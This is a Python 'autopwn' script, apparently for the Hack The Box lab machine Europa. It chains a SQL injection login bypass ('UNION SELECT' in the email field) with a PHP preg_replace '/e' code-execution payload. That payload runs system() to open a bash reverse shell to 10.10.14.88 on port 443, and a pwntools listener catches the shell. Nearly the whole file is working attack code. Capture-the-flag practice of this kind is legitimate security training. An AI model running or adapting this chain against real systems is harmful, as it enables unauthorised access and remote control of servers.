#!/usr/bin/python3

# autopwn script originally created by S4vitar.
# This script is for the box HTB Europa.
# You must login first to this will auto get you a shell.
# Or you can use the autologin version of this script first and this one second

from pwn import *
import requests
import signal
import sys
import threading
import pdb
import time
import urllib3
import logging
from scapy.all import *
from termcolor import colored

urllib3.disable_warnings()

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def def_handler(sig, frame):
    print(colored(f"\n\n[!] Exiting...\n", 'red'))
    p1.failure("::(Ctrl + c pressed)")
    sys.exit(1)

# CTRL + c
signal.signal(signal.SIGINT, def_handler)
p1 = log.progress("Sending Payload")
p1.status("Requesting Interactive Shell...")

# Globa Variables
login_url = "https://admin-portal.europacorp.htb/login.php"
rce_url = "https://admin-portal.europacorp.htb/tools.php"
lport = 443

def makeRequest():
    s = requests.session()
    s.verify = False

    post_data = {
        'email': "test@test.com' UNION SELECT 1,2,3,4,5-- -",
        'password': '1234'
    }

    r = s.post(login_url, data=post_data)
    post_data = {
        'pattern': '/pwned/e',
        'ipaddress': "system('bash -c \"bash -i >& /dev/tcp/10.10.14.88/443 0>&1\"')", # <- Change Me
        'text': "pwned"
    }
    r = s.post(rce_url, data=post_data)

if __name__ == '__main__':
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e)) 

    shell = listen(lport, timeout=10).wait_for_connection()

    shell.interactive()

    #makeRequest()
